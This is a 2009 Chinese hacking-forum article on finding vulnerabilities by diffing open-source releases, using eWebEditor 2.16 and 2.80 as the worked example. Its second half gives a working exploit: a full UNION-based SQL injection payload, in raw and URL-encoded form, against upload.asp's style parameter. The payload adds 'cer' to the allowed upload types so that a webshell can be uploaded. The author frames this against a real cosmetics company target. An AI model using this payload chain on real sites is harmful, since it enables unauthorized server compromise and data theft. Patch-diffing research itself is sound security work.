@@ -1,0 +1,151 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+读新术-基于开源代码更新的漏洞挖掘技巧
+D8888D主贴内容-------------------------------------------------------
+作者：FireFox[F.s.T]
+
+文章投稿于09年2月黑客手册[url=http://www.nohack.cn/]链接标记http://www.nohack.cn/[/url]
+经编辑同意放出 目的是为与大家有更好的交流 更多精彩内容请参阅 黑客手册
+
+背景：
+所谓补丁或者更新，一直以来是研发方为更新产品安全问题、增加新功能或提高运行效率而发布的。但对于安全研究人员来讲，补丁或者更新一直以来也被认为是漏洞挖掘的“指南针”，就类似微软发布更新的星期二，就被很多安全研究人员喻为“Black tuesday”，为什么这样讲呢？因为很多安全研究人员可以根据补丁逆向分析出问题所在，从而再次触发漏洞，迅速编写漏洞溢出代码，通常情况下这种漏洞代码不被认为是0day，但是在大的范围内造成的影响丝毫不比0day差。
+
+
+前景：
+开放源代码是研发方为迅速壮大产品、扩大知名度的产物，大家常遇到的如linux、php、apache、firefox等等都是知名的开源产品，大家从上也能看出无论服务端、客户端甚至一些安全相关的软件也基于开源，由此分析开源代码的漏洞挖掘是大有前景，同时也相对简单，因为不需要漫无目的fuzz，更不需要一脸茫然的立即面对二进制。大家对sql注入的技术研究应该已经炉火纯青了，我也相信大家玩cookies注入有段日子了，为什么cookies注入？因为火狐技术联盟枫知秋写出的“火狐通用防注入”程序在一段日子里给大家的注入带来了一定的困扰，后来经安全研究人员提出，该程序设计存在一定的疏漏，也就是疏忽了cookies这种非正常提交，进而出现了cookies注入，注入中转等相关利用方法，因为源代码问题被找出漏洞的太多太多，但是对于一些研发方直接发布的补丁或者新版本，不知道大家有没有考虑过这其中补救了一些你不知道的漏洞，也因为其中引入了一些新的功能而引入了新的漏洞呢？研究技术我们必须抱有一个谦虚的态度，因为一些开源研发方发布的补丁，往往也侧面透漏出研发方相关安全人员研究出的新的漏洞挖掘趋势。
+
+关于本文：
+这篇文章只是给大家一个小的观念，一些小的技巧，并不包含很多代码实例，当然要想真正掌握这种技术，你当然需要一些基础，因为大家方向不同所以你要了解你所研究方向的编程基础，比如你要有asp的基础这样可以让你轻松揪出动网6.0-6.01-7.0-7.01这样一个过程中修补了什么样的漏洞，比如你要有php的基础这样可以让你轻松揪出DZ5-DZ6…其中一些并没有发布出来而被直接update的漏洞，当然也许你更深入关于php 5 alpha2 和alpha3你想了解很透彻你就需要了解php开发语言的编程基础了。当然本文的最后我会给出一个简单分析的示例。
+
+一些准备：
+除了编程基础之外还需要一些正则表达式和一些工具，一个好的文本编辑器UE就不错，支持正则的替换方法可以让你净化代码后再进行分析，这样不至于被一些无关紧要的改动污染眼睛。另外就是比较工具，我自己写过一个脚本进行处理后来发现一个名为DiffMerge(图1)的软件比自己写的脚本直观多了，所以就用DiffMerge（以下简称DF），该工具能很快对比文件目录结构、然后对比对应文件改动给出直观的分析结果。
+[attach]594[/attach]
+目标：
+以一个ASP的简单的例子，给大家阐述一次渗透测试，我想这样更为直观，当然用这样的方法你可以冲动的去研究apache或者php的一些版本更新了，达到这样的目的已足够。这次渗透测试的目标是一个全球百强的化妆品企业的相关资料，渗透测试的信息收集非常重要，当然不是本文的主旨。
+
+实际应用：
+在经过一番信息收集后判断出对方基本是自己开发的程序，但采用了ewebeditor，有默认口令但没有登陆的端口，但是对方整个网络也仅有一个这样的入口了，如果无法攻破那么就要想办法实施社工，入侵陷入僵局，再仔细的翻看得到的信息默认的ewebeditor数据库引起我的注意，见图2。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0902/20090223_c0bacf327045aad3debebBdx6wXJrsq0.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTk1fDg1MjAxZTMwfDEyODY0ODI3Nzh8NjZmMUFuWWJuRy9pemUzQWwvOHRmMHJyYndpSXBzR1dXSVh2OTk2ZS9SVnNMemM%3D&nothumb=yes]链接标记下载[/url] (68.92 KB)
+
+2009-2-23 08:54
+2004年的ewebeditor 2.16版，于是立即找到最新版和这个老版本的程序，2.80最终版其版本更新说明是这样的：
+1、上传文件处理
+2、后台默认开启允许修改自带样式
+v2.8.0更新：
+修复使用相对路径时，从其它站copy图片后粘贴，地址失效的问题
+修复一个表单中有多个编辑区时，会多次提交的问题
+修复非菜单按钮的撤消和恢复功能不能使用的问题
+修复对象上移或下移一层有脚本错误信息的问题
+修复删除对象时有脚本错误信息的问题
+v2.8.0修正版更新：
+1、修正远程文件自动上传可能导致表单二次提交的问题。
+此功能的实现方法使得远程自动上传功能更加强大，当一个表单中有多个编辑区时，可以指定某个编辑区内的文件自动上传，而其它的不用自动上传，具体见例子文件。
+2、修改简单新闻系统例子。
+第一点上传文件处理这块就引起我的注意，其实很多的安全通告都以下面的形式告诉大家更新，但是确不说明更新的位置。比如
+1修补了多个安全更新
+2修补一些已知的安全隐患
+如果说二进制补丁分析有一定的难度，大家因为水平有限无法分析，那么开源的代码这样公告，如果我们不搞清楚那就是对自己的不负责了。言归正传，打开DF3将两个版本进行比较（大家也许会说直接那2.16的代码读下找就行了，为什么还这么费劲，那么请回到本文首节理解下“指南针”的含义，我给出这样代码的原因是为了给大家一个新的思路而已，并不是为了辩驳直接读代码有什么不对）
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0902/20090223_27d4e415887ff3d63541ag411luCx9eH.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTk2fDJmMWJjNzg0fDEyODY0ODI3Nzh8NjZmMUFuWWJuRy9pemUzQWwvOHRmMHJyYndpSXBzR1dXSVh2OTk2ZS9SVnNMemM%3D&nothumb=yes]链接标记下载[/url] (78.65 KB)
+
+2009-2-23 08:54
+图三释意，相同文件267，不同的61那修补的部分或者新的功能应该就在61个文件内，相信我，有的时候安全漏洞利用是很蹊跷的，没有一个“指南针”你去直接分析Discuz或者VBB的代码试下，就知道有多么辛苦。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0902/20090223_fd0234621f75f1c9cb21dNbWcHu90ICK.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTk3fDZmM2Q4N2E4fDEyODY0ODI3Nzh8NjZmMUFuWWJuRy9pemUzQWwvOHRmMHJyYndpSXBzR1dXSVh2OTk2ZS9SVnNMemM%3D&nothumb=yes]链接标记下载[/url] (108.9 KB)
+
+2009-2-23 08:54
+以图四进行条件筛选，只显示不相同的部分，结果如图五
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0902/20090223_67ce1f73f95d184e0a24cIvjC1YvJCcc.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTk4fDk3NDA3YjkzfDEyODY0ODI3Nzh8NjZmMUFuWWJuRy9pemUzQWwvOHRmMHJyYndpSXBzR1dXSVh2OTk2ZS9SVnNMemM%3D&nothumb=yes]链接标记下载[/url] (2.68 KB)
+
+2009-2-23 08:54
+两种颜色代表是有不同之处，若你全部选择的话可以看到有黑色部分，黑色在A则代表2.16版本有的文件2.80版本没有，反之大家应该就知道怎么解释。限于篇幅我们直奔主题upload.asp因为2.8说更新了一个上传的问题，双击upload.asp
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0902/20090223_a0d32c024b2d9cbfc8b5K6yl8Q3KO393.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTk5fGUyNTY3NGI5fDEyODY0ODI3Nzh8NjZmMUFuWWJuRy9pemUzQWwvOHRmMHJyYndpSXBzR1dXSVh2OTk2ZS9SVnNMemM%3D&nothumb=yes]链接标记下载[/url] (155.59 KB)
+
+2009-2-23 08:54
+两种颜色对应，标示不同的段落进行了更新，我分析了下发现一个注入的问题存在，并没有所谓的上传漏洞，代码如下：
+2.16版本的如下写法 Sub InitUpload()
+
+sType = UCase(Trim(Request.QueryString("type")))
+
+sStyleName = Trim(Request.QueryString("style"))
+复制代码2.80版本如下写法 Sub InitUpload()
+
+sType = UCase(Trim(Request.QueryString("type")))
+
+sStyleName = Get_SafeStr(Trim(Request.QueryString("style")))
+复制代码然后同样的方式读取数据库来返回样式的配置 sSql = "select * from ewebeditor_style where s_name='" & sStyleName & "'"
+复制代码很明显2.16的注入问题所在就是在upload.asp文件，怎么利用呢？这里就是问题所在，传统的注入我们是为了拿到后台管理帐户，如果是sql我们可以backupshell或者dirtree，但是这里是ac，而且登陆的页面也已经被和谐了，再仔细的研究这个编辑器上传的原理吧
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0902/20090223_f4b9a578ff831b28dea2WQftXuEa9Rld.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NjAwfGMxMTRiNTZifDEyODY0ODI3Nzh8NjZmMUFuWWJuRy9pemUzQWwvOHRmMHJyYndpSXBzR1dXSVh2OTk2ZS9SVnNMemM%3D&nothumb=yes]链接标记下载[/url] (12.59 KB)
+
+2009-2-23 08:54
+既然sStyleName(style)处有注入那么我们完全可以使用union来控制返回的内容，再S_ImageExt字段加上一个cer类型来实现上传一个webshell,这样的方法的确蹊跷，不过确定是可行的，下面本地进行一些测试架设ewebeditor2.16
+首先直接请求下upload.asp发现返回代码如下：
+文件顶部： <script language=javascript>parent.UploadError('无效的样式ID号，请通过页面上的链接进行操作！');history.back()</script>
+复制代码关键代码： var sAllowExt = "";
+
+// 检测上传表单
+
+function CheckUploadForm() {
+
+if (!IsExt(document.myform.uploadfile.value,sAllowExt)){
+
+parent.UploadError("提示：\n\n请选择一个有效的文件，\n支持的格式有（"+sAllowExt+"）！");
+
+这是正常因为我们并没有给他一个正常的样式，下面给他一个正常的样式看看返回结果
+
+请求：upload.asp?action=save&type=IMAGE&style=standard
+
+关键代码变为：
+
+var sAllowExt = "GIF|JPG|JPEG|BMP";
+
+// 检测上传表单
+
+function CheckUploadForm() {
+
+if (!IsExt(document.myform.uploadfile.value,sAllowExt)){
+
+parent.UploadError("提示：\n\n请选择一个有效的文件，\n支持的格式有（"+sAllowExt+"）！");
+
+return false;
+
+}
+
+return true
+
+}
+复制代码代码正确执行，读取了数据库中样式为standard的图片上传类型，那么下面我们就需要想办法构造我们的注入代码，利用使用union来控制数据库内的字段返回，对照了一下数据库的字段我构造了如下代码 upload.asp?action=save&type=IMAGE&style=fst' union select S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]+'|cer',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard' and 'a'='a
+复制代码将其URL编码处理一下 upload.asp?action=save&type=IMAGE&style=firefox'%20union%20select%20S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt,%20[S_ImageExt]%2b'|cer',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl%20from%20ewebeditor_style%20where%20s_name='standard'%20and%20'a'='a
+复制代码提交下我们再来看upload.asp返回给我们的关键部分内容 var sAllowExt = "GIF|JPG|JPEG|BMP|CER";
+
+// 检测上传表单
+
+function CheckUploadForm() {
+
+if (!IsExt(document.myform.uploadfile.value,sAllowExt)){
+
+parent.UploadError("提示：\n\n请选择一个有效的文件，\n支持的格式有（"+sAllowExt+"）！");
+
+return false;
+
+}
+
+return true
+
+}
+复制代码图 [img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0902/20090223_9b1acbbbc1cc28a09664CmrXcWvv9rDg.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NjAxfDcxZjA3ZWM1fDEyODY0ODI3Nzh8NjZmMUFuWWJuRy9pemUzQWwvOHRmMHJyYndpSXBzR1dXSVh2OTk2ZS9SVnNMemM%3D&nothumb=yes]链接标记下载[/url] (59.56 KB)
+
+2009-2-23 08:54
+成功将cer文件加载进了配置，但是默认的upload.asp文件是没有提交按钮的，我们伪造一个好了，当然这里用nc也可以了
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0902/20090223_147d16b48b19fbf69099g3Wa4yBUmx7M.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NjAyfDBlNGNhODllfDEyODY0ODI3Nzh8NjZmMUFuWWJuRy9pemUzQWwvOHRmMHJyYndpSXBzR1dXSVh2OTk2ZS9SVnNMemM%3D&nothumb=yes]链接标记下载[/url] (86.93 KB)
+
+2009-2-23 08:54
+选择一个cer的文件上传，成功后自动返回到http://localhost/upload.asp我们再来查看源代码
+最后一行 <script language=javascript>parent.UploadSaved('20081223151151624.cer');parent.dialogArguments.addUploadFile('2006.cer', '20081223151151624.cer');history.back()</script>
+复制代码一个webshell到手了。
+后话：
+以这样一个蹩脚的例子搞这样一个标题的确有些夸张，不过这里仅仅是说一种思路，如果在discuz或者php或者apache的版本更新中找问题往往不是 这样简单，当然无论怎样一个“指南针”一定能为你的漏洞挖掘工作提升效率。最后，由于很少这样的长篇大论，思路和文笔也都有限，对本文大家若有疑问或者更 好评判请联系我[url=http://www.t00ls.net/mailto:firefox.fst@gmail.com]链接标记firefox.fst@gmail.com[/url]。
+[url=http://www.t00ls.net/attachment.php?aid=NjAzfDc0YWEzYjE4fDEyODY0ODI3Nzh8NjZmMUFuWWJuRy9pemUzQWwvOHRmMHJyYndpSXBzR1dXSVh2OTk2ZS9SVnNMemM%3D&nothumb=yes]链接标记200902201422090328.jpg[/url] (47.78 KB) 
+下载次数:0
+2009-2-23 08:54
+
+ [img]http://www.t00ls.net/attachments/month_0902/20090223_a6159beec19add86755cjFtcdvMCrZ1m.jpg[/img]
